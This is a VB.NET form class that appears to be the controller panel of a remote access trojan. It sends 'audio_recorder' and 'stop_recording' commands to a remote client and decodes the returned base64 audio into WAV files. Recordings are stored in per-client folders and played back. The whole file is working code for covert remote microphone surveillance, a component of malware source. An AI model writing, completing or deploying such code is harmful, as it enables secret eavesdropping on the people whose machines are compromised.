﻿Public Class Record_Audio
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String

    Private StrDateTime$ = "00:00:00"
    Private startTime As DateTime
    Sub Client_data(ByVal data As String)
        Try
            If data IsNot Nothing Then
                If data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]") Then
                    Dim spl_Exception() As String = {"[My/Exception]"}
                    Dim p() As String = data.Split(spl_Exception, StringSplitOptions.RemoveEmptyEntries)


                    Label1.Text = p(0)
                    If Panel3.Visible = False Then Panel3.Visible = True
                    Button1.Enabled = False
                    Button2.Enabled = False
                Else

                    If data = "[Im/Running]" Then


                        startTime = Nothing
                        StrDateTime = "00:00:00"
                        Timer1.Enabled = True
                        Button1.Enabled = False
                        Button2.Enabled = True

                    ElseIf data = "-2" Then
                        Button1.Enabled = False
                        Button2.Enabled = False
                    Else

                        Dim f As String = Application.StartupPath & "\" & store_0.name_folder_app_resource & "\Folder_Clients\" & Name_Client & Client_ID & "\" & "Audio_Manager"
                        If Not My.Computer.FileSystem.DirectoryExists(f) Then My.Computer.FileSystem.CreateDirectory(f)
                        Dim Dat_2 As String = DateTime.Now.ToString("yyyy-MM-dd-HH.mm.ss")
                        Dim NAM_2 As String = String.Format("{0:1}", Dat_2, Nothing)
                        Dim Complete As System.Text.StringBuilder = New System.Text.StringBuilder()
                        Complete.AppendFormat("{0}", data)

                        IO.File.WriteAllBytes(f + "\" + NAM_2 + ".wav", Convert.FromBase64String(Complete.ToString))
                        AxWindowsMediaPlayer1.URL = f + "\" + NAM_2 + ".wav"

                        AxWindowsMediaPlayer1.Ctlcontrols.play()
                        Timer1.Enabled = False
                        Button1.Enabled = True
                        Button2.Enabled = False
                        Button2.Text = "Stop recording(" + StrDateTime + ")"
                    End If





                    If Panel3.Visible = True Then Panel3.Visible = False


                End If



            End If
        Catch ex As Exception

            'MsgBox(ex.ToString)
        End Try
    End Sub
    Private Sub Record_Audio_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        refres_title()
        Me.Icon = store_0.icons_0("window")
    End Sub
    Private Sub refres_title()
        Dim title As String = String.Format("Audio Record" + " - Remote Address & Port: {0} Client Name: {1}", Client_remote_Address, Name_Client)
        Text = title
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Form1.s.Send(handle_Number_Client, "stop_recording")
        Button2.Enabled = False
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Button1.Enabled = False

        Form1.s.Send(handle_Number_Client, "audio_recorder")

    End Sub

    Dim b91% = 0
    Function e90() As String
        If b91 > 2 Then
            b91 = 0
        End If
        Select Case b91
            Case 0
                Return "."
            Case 1
                Return ".."
            Case 2
                Return "..."
            Case Else
                Return "..."
        End Select
    End Function
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        startTime = startTime.AddSeconds(1)
        StrDateTime = startTime.ToString("HH:mm:ss")
        'refres_title()

        If Button2.Enabled = False Then
            Button2.Text = "Stop recording(" + StrDateTime + ") Please Wait" + e90()
            b91 += 1
        Else
            b91 = 0
            Button2.Text = "Stop recording(" + StrDateTime + ")"
        End If
    End Sub
End Class